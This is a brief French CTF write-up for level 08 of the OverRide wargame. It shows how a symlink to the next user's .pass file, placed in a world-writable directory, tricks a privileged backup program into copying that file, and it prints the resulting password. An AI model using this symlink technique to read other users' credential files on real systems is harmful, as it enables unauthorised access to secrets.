# Level 08

```
chmod 777 .
ln -sf /home/users/level09/.pass ./pass
```

## Solution

Pour ce level, on vois dans le code que **argv[1]** est ouvert et sont contenue est save dans un dossier de log, donc il suffit de faire un lien symbolique du fichier .pass, et de donner les droit au user level09
.

### Payload

```
chmod 777 .
ln -sf /home/users/level09/.pass ./pass
./level08 pass
cat backups/pass
level08@OverRide:~$ cat backups/pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```